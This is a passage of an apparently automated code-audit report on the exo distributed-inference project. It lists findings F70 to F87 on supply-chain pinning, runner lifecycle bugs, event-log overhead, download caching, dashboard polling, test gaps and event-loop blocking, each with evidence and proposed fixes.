**Evidence.** build-app.yml:28 `SPARKLE_VERSION: 2.9.0-beta.1`; :191-198 `CLI_URL="${SPARKLE_CLI_URL:-https://github.com/sparkle-project/Sparkle/releases/download/${SPARKLE_VERSION}/Sparkle-${SPARKLE_VERSION}.tar.xz}"` ... `curl --fail --location --output /tmp/sparkle.tar.xz "$CLI_URL"` ... `tar -xJf` — no `shasum`/`--hash` check. :480-484 `$SPARKLE_BIN/generate_appcast --ed-key-file sparkle_ed25519.key ...`.

**Mechanism.** GitHub release assets are mutable and the download crosses a TLS boundary controlled by a third party; if the asset is replaced or the release account compromised, the substituted `generate_appcast` receives the update-signing private key and produces the appcast that every EXO.app trusts. Pinning to a pre-release also means the tool that signs production updates is one the Sparkle project has not declared stable.

**Fix.** Record the SHA-256 of the exact tarball next to `SPARKLE_VERSION` and verify with `echo "$SHA  /tmp/sparkle.tar.xz" | shasum -a 256 -c` before extracting; move to a GA Sparkle release; or package Sparkle in nix (nixpkgs has `sparkle`) so it is content-addressed and cached like the rest of the toolchain.

### F70 — Every native fork (zenoh, mlx, mlx-lm, mflux, pidfile-rs, CUDA wheels) lives on a personal GitHub account and is referenced by branch or with no ref at all

*`Cargo.toml:60` — medium · effort M · finder-reported · lens `build-deps` · confidence 0.85*

**Evidence.** Cargo.toml:60 `pidfile-rs = { git = "https://github.com/AndreiCravtov/pidfile-rs" }` (no rev/tag/branch); :63-89 twenty-seven `[patch.crates-io]` entries `{ git = "https://github.com/evanev7/zenoh.git", branch = "exo" }`. pyproject.toml:84 `mlx ... branch = "address-rdma-gpu-locks"` (rltakashige), :96 `mlx-lm ... branch = "leo/deepseek-v4"`, :97 `mflux ... branch = "exo2"` (evanev7), :85-94 six wheel URLs under `rltakashige/.../releases/download/mlx_cuda/`. Locks pin commits (Cargo.lock:2500 `pidfile-rs#faf6b79e...`, :5110 `zenoh?branch=exo#aa219b84...`; uv.lock:1378, :1549, :1339) and wheel sha256 (uv.lock:1386-1400).

**Mechanism.** The lock only protects against silent drift, not availability: a force-push, branch rename, repo deletion or account change on any of the three personal accounts makes the locked commit unreachable and `uv sync`/`cargo fetch`/`nix build` fail for every developer and CI job simultaneously, with no path to rebuild a past release. Any `cargo update`, `uv lock --upgrade`, or a new contributor running `uv lock` moves all 30+ patched crates and three Python packages to whatever the branch head is that day, changing the transport layer and inference engine without a code change in this repo. The `mlx_cuda` release tag is reused for multiple assets, so a re-upload changes bytes under a stable URL (uv would then fail on hash mismatch with no explanation of why).

**Fix.** Move the forks under the exo-explore organisation (or a dedicated `exo-explore/*-fork` mirror), reference them by `rev = "<sha>"`/`tag =` in Cargo.toml (`pidfile-rs = { git = ..., rev = "faf6b79e40e931c149f1f58dc4fb53ec1be3ff3c" }`) and `[tool.uv.sources]`, and host the CUDA/CPU wheels on an org-owned release or a package index. Add a CI job that runs `cargo fetch --locked` and `uv sync --locked --frozen` from a clean cache to catch unreachable sources early.

### F71 — Graceful Shutdown tears the supervisor down right after the ack, so RunnerShutdown and the task's Complete never reach the master and ghost RunnerShuttingDown entries accumulate in state

*`src/exo/worker/main.py:293` — medium · effort S · finder-reported · lens `worker-runner` · confidence 0.80*

**Evidence.** main.py:281-293: `runner = self.runners.pop(runner_id)`, `with fail_after(3): await runner.start_task(task)`, `finally: runner.shutdown()`. `start_task` returns as soon as `TaskAcknowledged` arrives (supervisor.py:299, 329-331). The runner's shutdown order (runner.py:313-322) is `update_status(RunnerShuttingDown())`, `acknowledge_task(task)`, `self.generator.close()`, `gc.collect()`, `send_task_status(Complete)`, `update_status(RunnerShutdown())` — the last two are sent only after freeing the model. `runner.shutdown()` → `_tg.cancel_tasks()` (275-276) cancels `_forward_events` and `run`'s finally closes `_ev_recv` (258-259). apply.py:259-268 removes a runner from `state.runners` only on `RunnerShutdown`; master emits `TaskDeleted` only for API commands via `TaskFinished` (master/main.py:418-425). test_event_ordering.py:395-405 documents that Complete/RunnerShutdown follow the ack.

**Mechanism.** Every instance deletion (and every sibling-failure recreate that goes through Shutdown) leaves `state.runners[runner_id] = RunnerShuttingDown()` and `state.tasks[shutdown_task_id].task_status == Running` for the lifetime of the master session; the same happens on the timed-out path where the process is SIGTERMed. These ghosts are served by `/state`, land in the dashboard `runners` store (app.svelte.ts:1330-1331), are persisted in the event log, and every worker-emitted task (CreateRunner, DownloadModel, ConnectToGroup, LoadModel, StartWarmup, Shutdown, CancelTask) is never deleted, so `state.tasks` scanned 10x/s by `_cancel_tasks`/`_pending_tasks` grows with instance churn.

**Fix.** In the Shutdown branch wait (bounded, e.g. 10 s) for the supervisor to observe `RunnerShutdown` or process exit before calling `runner.shutdown()`, and regardless of path have the Worker itself publish `RunnerStatusUpdated(runner_id, RunnerShutdown())` after teardown so `apply_runner_status_updated` always prunes; emit `TaskStatusUpdated(Complete)` and `TaskDeleted` for worker-emitted lifecycle tasks once their effect is observed.

### F72 — Runner processes are orphaned with the model resident when the parent exo process is killed or crashes — no PDEATHSIG or parent-pid watchdog, and the child holds both pipe ends so it never sees EOF

*`src/exo/utils/async_process.py:100` — medium · effort S · finder-reported · lens `worker-runner` · confidence 0.80*

**Evidence.** async_process.py:90-102 creates `mp.Process(..., daemon=self._daemon)`; grep for PDEATHSIG/getppid/prctl across src/exo returns nothing; bootstrap.py:40-105 installs no parent watchdog. The runner's reader thread blocks in `task_receiver` (runner.py:166-174) → channels.py:337 `self._state.buffer.get()`. Verified in a spawned child of `mp_channel` that `buffer._reader.closed == False` and `buffer._writer.closed == False`, i.e. the child keeps its own write end, so the parent's death never produces EOF. main.py:157-159 installs graceful handlers for SIGINT/SIGTERM only.

**Mechanism.** `daemon=True` only terminates children on a normal interpreter exit. If exo is SIGKILLed, OOM-killed, or segfaults in the Rust/MLX extension, every runner keeps blocking in `get()` (or in the generation-loop hang) with a multi-GB model wired in unified memory and ring sockets open. Nothing on restart finds or reaps them (the pidfile tracks only the parent), so the next placement fails memory checks or the operator sees unexplained memory pressure until they kill the processes by hand.

**Fix.** In `_run_with_captured_stdio` (or `entrypoint`) start a daemon thread that polls `os.getppid()` every second and calls `os._exit(1)` when it changes (works on macOS and Linux); on Linux also `prctl(PR_SET_PDEATHSIG, SIGTERM)`; optionally write child pids next to the pidfile so a fresh exo can reap leftovers at startup.

### F73 — PrefillTask stays in the runner work queue after the 3 s pickup timeout, so the runner later performs a full prefill for a request whose socket is already closed

*`src/exo/worker/runner/runner.py:143` — medium · effort S · finder-reported · lens `concurrency` · confidence 0.80*

**Evidence.** runner.py:136-155 `resolve`: `self._work_queue.put(req)`; `if not req.started.wait(timeout=PREFILL_PICKUP_TIMEOUT_SECONDS): ... return False` with no removal from `_work_queue`. server.py:72-83: on `False` the handler writes a 503 and returns, after which `StreamRequestHandler.finish` closes `wfile`. runner.py:214-216 and 364-366 dequeue the stale `PrefillTask` whenever the main thread next drains the queue and call `_serve_prefill`, which runs `serve_prefill` (batch_generator.py:558-572, a full model prefill plus `write_cache_to_wire` to the closed file; the resulting exception is only logged at runner.py:184-187).

**Mechanism.** While the runner is busy (long decode step), a decode node sends a prefill request; after 3 s the server answers 503 and the client retries or falls back. The `PrefillTask` remains queued, so when the current step ends the runner spends seconds of GPU time prefilling a prompt nobody will read, then fails writing to the dead socket. Under load every timed-out request is executed once more, inflating queueing delay for real generation tasks and possibly causing further pickup timeouts (a feedback loop).

**Fix.** Make `PrefillTask` cancellable: on pickup timeout set a `req.abandoned = True` (or `threading.Event`) in `resolve` before returning False, and have `_serve_prefill` skip (and not `started.set()`) when it is set; alternatively keep prefill requests in a separate bounded queue that `resolve` can remove from on timeout. Add a test in test_server_drain.py that times out a request and asserts the runner does not call `serve_prefill` for it.

### F74 — After five failed runner attempts the worker deletes the instance with only a local log line; no failure reason ever reaches cluster state, the dashboard, or /await_instance_ready

*`src/exo/worker/main.py:213` — medium · effort M · finder-reported · lens `resilience` · confidence 0.80*

**Evidence.** worker/main.py:211-223: `if self._instance_backoff.attempts(iid) >= EXO_MAX_INSTANCE_RETRIES: logger.warning(...); await self.command_sender.send(ForwarderCommand(..., command=DeleteInstance(instance_id=iid)))` — `EXO_MAX_INSTANCE_RETRIES = 5` (constants.py:108). The only diagnostic artefact, `RunnerFailed(error_message, diagnostics)` (runners.py:66-68), lives in `state.runners` and is removed by `apply_runner_status_updated` on `RunnerShutdown` (apply.py:259-272) or becomes orphaned once `InstanceDeleted` removes the instance; nothing persists an instance-level failure. The API's `_await_instance_ready` (api/main.py:646-668) only polls `state.instances` and reports `"No instance found for model ..."` on timeout; the dashboard maps `RunnerFailed` to "Failed" (+page.svelte:1910) only while the runner entry exists.

**Mechanism.** A user places a model; on one node the runner crashes on load five times in a row (bad weights file, Metal OOM, ring socket refused). Roughly 15 s later the instance simply disappears from the dashboard and `/await_instance_ready` eventually returns a generic timeout. The only explanation is a WARNING in the worker node's log file, which the user placing from another node never sees; the natural reaction is to place again and hit the same loop.

**Fix.** Add an `InstanceFailed(instance_id, node_id, reason, diagnostics)` event (or fold a `failure_reason` into the `DeleteInstance` command → `InstanceDeleted` event) that the worker emits with the last `RunnerFailed.error_message`/`diagnostics` before requesting deletion; keep a bounded `state.recent_instance_failures` map so the API can return it from `/await_instance_ready` (a `AwaitInstanceFailedMessage`) and the dashboard can show a toast with the actual runner error.

### F75 — Every generated token is JSON-encoded twice, msgpack-encoded and written to two disk logs, and applied to three State replicas on every node in the cluster

*`src/exo/api/main.py:1973` — medium · effort M · finder-reported · lens `performance` · confidence 0.80*

**Evidence.** runner.py:388-394 emits one `ChunkGenerated` per token. event_router.py:417-429 wraps it in `LocalForwarderEvent`; router.py:104-113 + 143-147 `PublishPolicy.Always` serialises with `model_dump_json()` and publishes to zenoh even with zero peers. master/main.py:508-522: `event.model_copy(...)`, `apply(...)` (a `State.model_copy` per event, apply.py:128-136), `self._event_log.append(event)` (msgpack of `model_dump(mode='json')`, disk_event_log.py:23-24, 113-117) and `_send_indexed_event` (JSON again, 525-534) to GLOBAL_EVENTS. On every node, api/main.py:1970-1974 `_apply_state` does `self._event_log.append(i_event.event)` and `apply(...)` for every event; the API log is only ever read by the `/events` debug endpoint (1013-1027). worker/main.py:140-145 applies it a third time. apply.py:85-93 shows ChunkGenerated has no effect on State.

**Mechanism.** Per token on the originating node: 2 pydantic JSON encodes, 2 `model_dump(mode='json')`+msgpack encodes, 2 buffered file writes, 3 `State.model_copy`, 2 zenoh publishes; on every other node: 1 JSON decode, 2 applies and 1 msgpack+disk write, for tokens of requests those nodes have no client or runner for. Cluster control-plane CPU therefore scales as O(N * total tokens/s) on the same event loop that streams SSE, capping aggregate throughput with batching (8 concurrent requests) well below what the GPUs can produce, and the per-node event log grows by a record per token (rotated only at session end, disk_event_log.py:153-161).

**Fix.** Short term: skip persistence for pass-through events (guard in `DiskEventLog.append` or at master/main.py:521 and api/main.py:1973 by event type) and remove the API-side DiskEventLog unless a debug flag is set. Medium term: deliver `ChunkGenerated` from the runner's node straight to the requesting node's API over a dedicated unicast topic (carry the requesting `NodeId` in `TextGenerationTaskParams`), leaving only TaskStatus transitions in the replicated log.

### F76 — EventRouter retransmits every un-indexed event every 5 s forever, so unacked TracesCollected leaks and master lag causes retransmit storms

*`src/exo/routing/event_router.py:395` — medium · effort S · finder-reported · lens `performance` · confidence 0.80*

**Evidence.** event_router.py:391-398 `_simple_retry`: every `1 + random()` s it iterates `list(self.out_for_delivery.items())` and re-sends anything older than 5 s, with no attempt cap, backoff, or per-tick limit. 417-429: every locally produced event is inserted; 440-443: an entry is removed only when the master's indexed copy of that `event_id` returns on GLOBAL_EVENTS. master/main.py:503-506: `if isinstance(event, TracesCollected): await self._handle_traces_collected(event); continue` - the event is never indexed or re-broadcast, so it is never acknowledged. TracesCollected is emitted per image generation per rank when EXO_TRACING_ENABLED (image/builder.py:73-94) and carries the full trace list.

**Mechanism.** (a) With tracing on, every image generation adds a TracesCollected entry per rank that is re-broadcast to the whole cluster every 5 s for the rest of the session; `out_for_delivery` and network traffic grow monotonically. (b) Whenever the master is more than 5 s behind (placement enumeration, HF search, a burst of tokens, or a partition), every node re-sends its entire unacked backlog - hundreds of ChunkGenerated events per busy node - every 5 s, adding load to the already-lagging master and to every peer that must deserialize the duplicates (router.py:250-251) before `OrderedBuffer.ingest` discards them.

**Fix.** Have the master acknowledge everything it consumes (index TracesCollected as-is, or emit a tiny `TracesAcknowledged(event_id)`), and make `_simple_retry` bounded: per-event exponential backoff, a maximum resend count after which the event is dropped with a warning, and a cap on resends per tick. Ideally also stop putting pass-through per-token events into `out_for_delivery` at all once they are delivered directly (see the per-token finding).

### F77 — Every node in a pipeline placement downloads and stores the full repository because resolve_allow_patterns unconditionally returns ['*']

*`src/exo/download/download_utils.py:844` — medium · effort L · finder-reported · lens `performance` · confidence 0.80*

**Evidence.** download_utils.py:839-851: `resolve_allow_patterns` has `return ["*"]` before the weight-map/`get_allow_patterns` logic, which is now dead code; 883-884 `download_shard` uses it for every shard. Placement assigns each node a memory-proportional contiguous layer range (placement_utils.py:490-510, 607-618) but `is_model_directory_complete` (338-357) and `_scan_model_directory` (313-333) require every file listed in the safetensors index, and `select_download_dir` (181-198) checks free space against the full size (933, 942-946).

**Mechanism.** A k-way pipeline placement of a 400 GB model downloads 400 GB onto each of the k nodes (k x WAN bandwidth, k x disk), so time-to-ready is bounded by the full-model download per node rather than the shard, and a node with disk headroom for its 1/k share but not the whole model fails placement with InsufficientDiskSpaceError. The existing shard-aware pattern code (`get_weight_map`, `get_allow_patterns`) is never exercised.

**Fix.** Re-enable shard-aware downloads for `PipelineShardMetadata`: use `get_weight_map` to derive the file set for [start_layer, end_layer) plus non-weight files, make `_scan_model_directory`/`is_model_directory_complete` accept the required-file set (so partial repos are 'complete' for that shard), size the disk check on the shard, and keep `['*']` for tensor sharding and image models (the TODO's cases (i)/(iii)). Note DownloadCompleted dedup by model_id (apply.py:148-158) must then key on shard range.

### F78 — Interface removed from announce list on HostUnreachable is never re-added, and swap_remove races the netwatcher thread

*`rust/networking/src/discovery.rs:258` — medium · effort S · finder-reported · lens `rust-transport` · confidence 0.80*

**Evidence.** announce() (discovery.rs:250-262) snapshots `let addrs = self.ifaces.lock().clone();` then on `io::ErrorKind::HostUnreachable` does `_ = self.ifaces.lock().swap_remove(i);` using the snapshot index. Nothing calls `leave_multicast_v6` there. The netwatcher callback (discovery.rs:63-103) re-runs `sock.join_multicast_v6(&GROUP, *iface_idx)` for every interface on every update and only pushes to `ifaces` on `Ok(())`; the already-joined case is explicitly swallowed: `Err(e) if e.kind() != io::ErrorKind::AddrInUse => {...}  _ => {}` (79-88). Only `update.diff.removed` triggers a leave (91-101). The callback runs on netwatcher's own thread (netwatcher watch_fd.rs:129-140) and mutates the same Vec via push/retain.

**Mechanism.** After a transient EHOSTUNREACH on an interface (laptop sleep/wake, Wi-Fi roam, link-local address not yet ready), the interface is dropped from the announce list but its multicast membership stays joined, so every later netwatcher update hits AddrInUse and never re-adds it. The node still answers Hellos on that interface but never announces, so a lower-zid node on that link (which is the only side allowed to dial, lib.rs:84-87) can never discover it: the cluster silently splits until exo is restarted. Separately, because `i` indexes a stale clone while the netwatcher thread may have pushed/retained concurrently, swap_remove can evict the wrong interface.

**Fix.** Key the announce list by interface index (`Mutex<HashMap<u32, SocketAddrV6>>`) and remove by key, and on HostUnreachable either leave the group (`sock.leave_multicast_v6(&GROUP, scope_id)`) so the next netwatcher update re-joins and re-adds, or simply skip the address for this tick and let `update.diff.removed` / `modified` drive membership. Log the disable at warn, not debug.

### F79 — /state polled at 1 Hz with no in-flight guard, no timeout, no visibility gating; a hung request never flips isConnected and stopPolling has no caller

*`dashboard/src/lib/stores/app.svelte.ts:1287` — medium · effort S · finder-reported · lens `dashboard` · confidence 0.80*

**Evidence.** `startPolling() { this.fetchState(); this.fetchFeatureFlags(); this.fetchInterval = setInterval(() => this.fetchState(), 1000); }` (1284-1288). `fetchState` (1308-1370) does `await fetch("/state")` with no `AbortSignal.timeout`, no `inFlight` flag, and assigns every field unconditionally on success. `consecutiveFailures++` only in `catch` (1361). `grep -rn stopPolling src/` matches only the definition (1290). Previews: `setInterval(...fetchPlacementPreviews..., 15000)` (1414-1418) plus immediate re-fetches at 1451, 1462, 1495 with no dedupe.

**Mechanism.** When the master is slow (large state, many downloads, election churn) or the TCP connection stalls, a new `/state` request is issued every second on top of the pending ones; the browser's 6-connection limit fills, later-issued requests can complete before earlier ones, and the older payload overwrites the newer (`instances`, `downloads` flicker backwards). A request that hangs indefinitely never rejects, so `isConnected` stays true and the 'Connection lost' toast (page.svelte:2528-2543) never fires while the UI shows stale data. Background tabs keep hammering the master indefinitely. `console.error` spams once per second during outages.

**Fix.** Guard with an `inFlight` flag (skip the tick if a request is pending), pass `signal: AbortSignal.timeout(2500)` so hangs count as failures, and pause the interval on `document.visibilityState === 'hidden'`. Apply the same in-flight guard to `fetchPlacementPreviews`. Consider a `lastUpdate` staleness watchdog that flips `isConnected` if no successful response in N seconds.

### F80 — Per-token work is O(response length): full markdown re-parse via {@html}, token array copies, message array clones, and always-on top_logprobs=5

*`dashboard/src/lib/stores/app.svelte.ts:2639` — medium · effort M · finder-reported · lens `dashboard` · confidence 0.80*

**Evidence.** On every streamed chunk `sendMessage` does `msg.tokens = [...collectedTokens]` (2639) and `this.syncActiveMessagesIfNeeded` → `this.messages = [...conversation.messages]` (1000-1010), then `persistConversation` (2643, 400 ms throttle → `JSON.stringify` of all conversations). Every request hardcodes `logprobs: true, top_logprobs: 5` (2525-2526, 1949-1950, 1726-1727) although the heatmap is an opt-in toggle (ChatMessages.svelte:710-736). ChatMessages renders `<MarkdownContent content={message.content || (loading ? response : "")} />` (627-629) and MarkdownContent's `$effect` (481-487) runs `processMarkdown` — ~40 regex passes over the whole text, `marked.parse`, hljs for every fence, KaTeX — then `{@html}` replaces the entire subtree.

**Mechanism.** For a 3,000-token answer with code blocks, each new token re-highlights every code block and re-renders every formula, allocates a 3,000-element token array (each with 5 nested logprob objects), and swaps the whole DOM fragment (dropping the user's text selection and any in-progress scroll). Frame time grows linearly with response length; on a laptop the UI becomes choppy well before the model finishes, and the SSE payload is ~6x larger than needed.

**Fix.** Throttle the streaming render (`requestAnimationFrame` or ~80 ms) in ChatMessages/MarkdownContent and only re-run `processMarkdown` on the throttled value; push tokens into the existing array instead of copying (`msg.tokens ??= []; msg.tokens.push(...)` under Svelte 5 proxies), and request `logprobs`/`top_logprobs` only when the heatmap is enabled for that conversation. Consider incremental rendering (parse only the trailing unclosed block).

### F81 — 24h file-list cache is never invalidated on failure; after an upstream re-shard, cached filenames 404 and every retry fails identically for up to a day

*`src/exo/download/download_utils.py:610` — medium · effort S · finder-reported · lens `download` · confidence 0.80*

**Evidence.** download_utils.py:86-87 `# 24h. Manually clear the cache (or delete_model) to force a refresh.`; :393-400 a fresh cache is returned unconditionally. :610-617 `file_meta` has no 404 branch: `content_length = int(... r.headers.get("content-length") or 0)` (the 404 body has a length) then `assert etag is not None, f"No remote hash for {url}"` — an AssertionError that :651-659 retries 5 times with `2.0**attempt` sleeps. Nothing deletes the cache file on a 404/FileNotFoundError; the only cache removal is `delete_model` :252-255 which also `rmtree`s the model directory (:246-250). Cache write at :425-428 is a plain `open(cache_file, "w")` (non-atomic).

**Mechanism.** mlx-community re-uploads a repo with different shard names (this happens on re-quantisation). The node's cached list still names the old files; `_download_file` HEADs `model-00003-of-00003.safetensors`, gets 404, asserts, sleeps ~15 s across 5 retries, and `download_shard` raises -&gt; DownloadFailed 'No remote hash for ...'. The rescan/worker retry every ~60 s (see the DownloadFailed finding) reproduces the same failure until the 24 h TTL elapses; the documented workaround (`delete_model`) throws away every gigabyte already downloaded. A truncated cache file from an unclean shutdown produces a ValidationError with the same 24 h stickiness.

**Fix.** Treat HEAD/GET 404 as `FileNotFoundError` immediately (no retries), and on any 404 from a cached file list delete `cache_file` (or call a new `invalidate_file_list_cache(model_id)`) so the next attempt refetches; consider recording the commit SHA from the tree response and re-validating on failure. Write the cache atomically (`tmp` + `aios.rename`) and catch `ValidationError` when reading, falling back to refetch. Add a test: cached list -&gt; 404 on a file -&gt; next `fetch_file_list_with_cache` must hit the network.

### F82 — ModelCard.fetch_from_hf hard-requires model.safetensors.index.json and hidden_size&gt;0; single-file repos fail after ~15 s of retries with a misleading error, and ModelCard.load triggers this as a side effect of placement previews

*`src/exo/shared/models/model_cards.py:365` — medium · effort M · finder-reported · lens `download` · confidence 0.80*

**Evidence.** model_cards.py:373-382: `index_path = await download_file_with_retry(model_id, "main", "model.safetensors.index.json", target_dir, ...)` with no existence check; a missing file goes through download_utils.py:610-615 (`assert etag is not None, f"No remote hash for {url}"`) and 5 retries at :651-659. :390 `info = model_info(model_id)` is a synchronous `requests` call awaited nowhere (blocks the event loop). :251 `hidden_size=config_data.hidden_size or 0` while :161 declares `hidden_size: PositiveInt`. :224-233 `ModelCard.load` calls `fetch_from_hf` and `save_to_custom_dir()` for any id not in the cache; api/main.py:431, 476, 522 call `ModelCard.load(payload.model_id)` from `place_instance`, `get_placement`, and `get_placement_previews`.

**Mechanism.** User adds `some-org/small-model` (a repo with only `model.safetensors`, common on HF) via POST /models/add: config.json downloads, then the index HEAD 404s, the AssertionError is retried for ~15 s, and the user gets HTTP 400 'Failed to fetch model: No remote hash for https://huggingface.co/.../model.safetensors.index.json'. A repo whose config lacks `hidden_size` (uses `d_model`/`n_embd`) fails with a raw pydantic 'hidden_size Input should be greater than 0'. Separately, a mistyped model id in the placement-preview request creates a model directory and a persistent custom card (or spends 15 s failing) as a side effect of a GET.

**Fix.** In `fetch_safetensors_size`, first HEAD the index; if 404, fall back to `model_info(model_id).safetensors.total` (run via `asyncio.to_thread`) or HEAD `model.safetensors` for its `x-linked-size`. Handle 404 in `file_meta` as FileNotFoundError without retries. Add `AliasChoices("hidden_size", "d_model", "n_embd")` to `ConfigData.hidden_size` and raise a descriptive error when it is still missing. Make `ModelCard.load` a pure cache lookup that raises when the card is unknown, and require the explicit /models/add path for network fetch + persistence.

### F83 — apply() has no invariant/property tests and apply_node_timed_out is untested, so replica divergence and node-removal leaks go unnoticed

*`src/exo/shared/apply.py:288` — medium · effort M · finder-reported · lens `test-gaps` · confidence 0.80*

**Evidence.** src/exo/shared/tests/test_apply/ covers custom model cards, instance links, one download reducer, RDMA gating and runner deleted. Nothing covers `apply_node_timed_out` (apply.py:288-347), `apply_task_status_updated`/`apply_task_failed` (:183-209), `apply_instance_created` (:212-218), `apply_topology_edge_*` (:473-483), or the ordering assertion in `apply()` (:130-134). Reading :288-347, NodeTimedOut strips `downloads, topology, last_seen, node_memory, node_disk, node_system, node_network, node_thunderbolt, node_thunderbolt_bridge, node_rdma_ctl` but not `node_identities` or `node_backends`, which `apply_node_gathered_info` populates at :378-399 and :464-468. No property-testing library is present (uv.lock has no hypothesis) and no test replays the same event stream twice to check determinism.

**Mechanism.** Every worker replays the master's indexed stream into its own State (worker/main.py:143); the whole design assumes `apply` is pure and deterministic. A reducer that mutates its input (e.g. via a shared Topology object without `deepcopy`) or is order-sensitive produces replicas that disagree with the master, and nothing in the suite would fail. The NodeTimedOut gap is concrete: a departed node's identity/backends linger in State forever (dashboard keeps listing it; placement filters that consult node_backends see a ghost node).

**Fix.** Add test_apply_node_timed_out.py: build a State via NodeGatheredInfo events for two nodes (MemoryUsage, StaticNodeInformation, NodeBackends, NodeNetworkInterfaces), apply NodeTimedOut for one, and assert with a generic loop over `State.model_fields` that no mapping keyed by NodeId still contains it (this fails today for node_identities/node_backends). Add test_apply_invariants.py that generates a seeded random sequence of ~200 events from a small factory (no new dependency needed; if hypothesis is desired, request it per RULES.md) and asserts: (a) `apply` never mutates its input (`before = state.model_dump(); apply(...); assert state.model_dump() == before`), (b) replaying the same sequence into two fresh States yields equal `model_dump()`, (c) `apply(state, IndexedEvent(idx=state.last_event_applied_idx + 2, ...))` raises AssertionError.

### F84 — Master promotion/demotion (_elect_loop) and the master's node-timeout reaper are untested; the single master test can hang forever

*`src/exo/main.py:180` — medium · effort M · finder-reported · lens `test-gaps` · confidence 0.80*

**Evidence.** `_elect_loop` (src/exo/main.py:180-275) tears down and recreates EventRouter, DownloadCoordinator, Worker and API on `is_new_master`, promotes/demotes Master, and calls `api.reset/unpause` — no test constructs a Node or drives this loop. Master._plan (master/main.py:471-490) emits InstanceDeleted for instances on departed nodes and NodeTimedOut after 30 s — no test. The only master test (test_master.py:50-252) is one happy path and waits with `while len(...) == 0: await anyio.sleep(0.001)` (:141-146, :172-173, :194-195) with no `fail_after`; pyproject has no pytest-timeout.

**Mechanism.** Master death is the headline failure mode of a bully-elected cluster, and the code that re-wires every component on it has zero coverage: a regression (e.g. worker not recreated, API left paused, download coordinator double-started) only appears in a multi-Mac lab. In test_master.py a regression that stops the master from emitting an event turns the test into an infinite loop that stalls the whole CI job rather than failing.

**Fix.** (1) Wrap each polling loop in test_master.py with `with fail_after(5):` and add `pytest-timeout` (needs approval per RULES.md) or a `timeout` marker. (2) Add test_master_plan.py: construct Master with channels, set `master.state` to include an instance whose node is absent from topology -&gt; assert InstanceDeleted emitted; set `last_seen` 31 s in the past -&gt; assert NodeTimedOut (monkeypatch `datetime` in exo.master.main or inject a clock). (3) Add src/exo/tests/test_elect_loop.py that builds a `Node` with a fake Router (in-memory TopicRouters, no exo_rs) and pushes ElectionResult(is_new_master=True, master=other) then (is_new_master=True, master=self): assert Master is None then not None, a fresh Worker/EventRouter object identity each time, and `api.reset` called with `won_clock`.

### F85 — KV prefix-cache eviction loop cannot observe freed memory, so exceeding the threshold wipes every entry

*`src/exo/worker/engines/mlx/cache.py:436` — medium · effort S · finder-reported · lens `mlx-engine` · confidence 0.75*

**Evidence.** cache.py:436-447: `while len(self.caches) > 0 and self.get_memory_used_percentage() > _MEMORY_THRESHOLD: ... self.caches.pop(lru_index) ...`; the only release happens after the loop at 454-456 `if evicted_any: gc.collect(); mx.clear_cache()`. The measurement is system-wide `psutil.virtual_memory().percent` (554-557), which includes the model weights and everything else on the machine. The existing test documents the outcome: test_kv_prefix_cache.py:604-609 'all old entries get evicted, leaving only the newly added one'.

**Mechanism.** Popping an entry only drops Python references; the MLX buffers go back to MLX's allocator pool and are not returned to the OS until `mx.clear_cache()`, so `psutil` reports the same percentage on every iteration and the loop runs until the list is empty. Because the threshold (0.70-0.85, 35-48) is compared against total system memory, any node running a model that fills most of RAM (the normal exo case) is permanently above it, and every `add_kv_cache`/`update_kv_cache` (called on every generation, generate.py:681-707, batch_generate.py:493-533) throws away all previously cached prompts. Cross-request prefix reuse (shared system prompts, multiple conversations) then effectively never happens beyond the single most recent entry, while each prefill still pays the deepcopy cost.

**Fix.** Budget the prefix cache by its own size instead of system pressure: sum `c.nbytes` over stored caches (every mlx_lm cache implements `nbytes`) and evict LRU until the total fits a budget derived from `mx.device_info()['max_recommended_working_set_size']` minus the model's weight size (already known via `get_weights_size`). If keeping the pressure heuristic, call `mx.clear_cache()` (and `gc.collect()`) inside the loop after each pop and use `mx.get_active_memory()` rather than psutil so the measurement can actually fall. Update the eviction test to assert only the LRU entry is removed.

### F86 — ImageEngine.step never returns FinishedResponse on non-primary ranks, so those runners spin at 100% CPU and stay RunnerRunning forever

*`src/exo/worker/engines/image/builder.py:172` — medium · effort S · finder-reported · lens `concurrency` · confidence 0.75*

**Evidence.** image/builder.py:162-176 `step`: `return ((resp,) if resp is not None and _is_primary_output_node(self.shard_metadata) else ())`; image/builder.py:218-222 the generator's `finally: yield (task_id, FinishedResponse())` is produced on every rank but filtered by the same primary check. runner.py:324-327 `submit_generation` adds the task to `active_tasks` on every rank; runner.py:341-361 `while self.active_tasks: results = self.generator.step() ... for task_id in finished: self.active_tasks.pop(...)` then `self._work_queue.get_nowait()` / `except queue.Empty: continue` with no sleep.

**Mechanism.** On a pipeline/CFG image instance, after the first image task completes, every non-primary rank's `step()` returns `()` forever, so `active_tasks` is never emptied, `handle_generation_tasks` never returns, `RunnerReady` is never re-published, and the loop becomes a tight busy-wait (`get_nowait` -&gt; Empty -&gt; `continue`) burning a full core on every non-primary node for the life of the runner. Later tasks still run (they are picked from `_work_queue` inside the loop), which masks the bug, but the dashboard shows those runners permanently 'running' and cancellation/shutdown latency and power draw suffer.

**Fix.** Return `FinishedResponse`/`CancelledResponse` on every rank and filter only chunk payloads by primary-ness, mirroring batch_generator.py:461-466 (`not isinstance(chunk[1], GenerationChunk) or self.device_rank == 0`): in `step`, always return the tuple when `resp[1]` is a `FinishedResponse`/`CancelledResponse`, and apply `_is_primary_output_node` only to `Chunk` results. Add a unit test constructing `ImageEngine` with a non-primary `PipelineShardMetadata` and asserting `step()` eventually yields `FinishedResponse`.

### F87 — search_models and fetch_safetensors_size call synchronous huggingface_hub functions on the single node event loop, stalling election/worker/master for the HTTP timeout

*`src/exo/api/main.py:1891` — medium · effort S · finder-reported · lens `security` · confidence 0.75*

**Evidence.** `search_models` (main.py:1870-1907) calls `list_models(...)` directly inside the `async def` handler — twice on the fallback path (1891, 1903). `HfApi.list_models` is a plain `def` using `requests` (huggingface_hub/hf_api.py:2207). `fetch_safetensors_size` (model_cards.py:390) likewise calls sync `model_info(model_id)`, reachable from `POST /models/add` and from any `ModelCard.load` cache miss (`place_instance`, `get_placement`, `ollama_show`). All components — Router pumps, EventRouter, Election, Worker, Master, API — run in one anyio TaskGroup in one process (`Node.run`, src/exo/main.py:154-167).

**Mechanism.** A dashboard model search while huggingface.co is slow, blocked by a corporate proxy, or DNS is failing freezes the whole node: no zenoh messages are pumped, the 3s election round timer misses ticks, the worker's 10 Hz plan loop and token forwarding stop, in-flight SSE streams stall. Each `requests` call can block for connect+read timeouts (10s default, DNS resolution can add ~30s), and two calls happen sequentially. Peers may time the node out and re-elect, resetting API state and dropping active generations.

